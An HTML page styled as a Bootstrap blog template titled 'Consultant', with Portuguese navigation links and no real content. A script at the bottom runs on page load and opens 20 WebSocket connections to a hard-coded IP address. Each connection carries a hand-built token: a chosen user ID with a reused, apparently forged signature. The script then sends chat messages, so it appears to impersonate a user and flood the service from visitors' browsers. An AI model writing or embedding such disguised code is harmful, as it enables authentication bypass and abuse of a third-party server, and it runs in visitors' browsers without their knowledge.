<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="/docs/4.0/assets/img/favicons/favicon.ico">

    <title>Consultant</title>

    <link rel="canonical" href="https://getbootstrap.com/docs/4.0/examples/blog/">

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">

    <!-- Custom styles for this template -->
    <link href="https://fonts.googleapis.com/css?family=Playfair+Display:700,900" rel="stylesheet">
</head>

<body>

<div class="container">
    <header class="blog-header py-3">
        <div class="row flex-nowrap justify-content-between align-items-center">
            <div class="col-4 mt-1">
                <a class="text-muted" href="#">Consultant</a>
            </div>
            <div class="d-flex justify-content-end align-items-center">
                <input class="form-control" type="text" name="search">
                <a class="text-muted" href="#">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mx-3"><circle cx="10.5" cy="10.5" r="7.5"></circle><line x1="21" y1="21" x2="15.8" y2="15.8"></line></svg>
                </a>
                <a class="btn btn-sm btn-outline-secondary" href="#">Sign up</a>
            </div>
        </div>
    </header>

    <div class="nav-scroller py-1 mb-2">
        <nav class="nav d-flex justify-content-between">
            <a class="p-2 text-muted" href="#">Criar um alarme</a>
            <a class="p-2 text-muted" href="#">Dentistas</a>
            <a class="p-2 text-muted" href="#">Psicologos</a>
            <a class="p-2 text-muted" href="#">Pediatras</a>
            <a class="p-2 text-muted" href="#">Culture</a>
            <a class="p-2 text-muted" href="#">Business</a>
            <a class="p-2 text-muted" href="#">Politics</a>
            <a class="p-2 text-muted" href="#">Opinion</a>
            <a class="p-2 text-muted" href="#">Science</a>
            <a class="p-2 text-muted" href="#">Health</a>
            <a class="p-2 text-muted" href="#">Style</a>
            <a class="p-2 text-muted" href="#">Travel</a>
        </nav>
    </div>
</div>

<main role="main" class="container">
</main>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
    var maxCountChats = 20;
    const cdate = () => Math.floor(new Date().getTime() / 1000)

    for (i = 0; i < maxCountChats; i++) {
        var payload = btoa(JSON.stringify({
            userId: "7d095b70-8a52-11ed-81f2-3f53c8d6ac6b",
            iat: cdate(),
            exp: cdate()
        }))

        var ws = new WebSocket(`ws://34.197.32.213:3000/socket.io/?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${payload}.nHDogfK9yDzUTACvxV4azlFiZF2CGnkzMMHYqZBdfiE&EIO=3&transport=websocket&sid=zCBBh43Wpc-cvOPNGPkS`)
        ws.addEventListener("open", () => {
            ws.send('2probe');
            ws.send('5')
            ws.send('42["message",{"event": "tp","data": null}]')
            ws.send('42["message",{"event":"ms","data":"opa"}]')

        })
    }
</script>
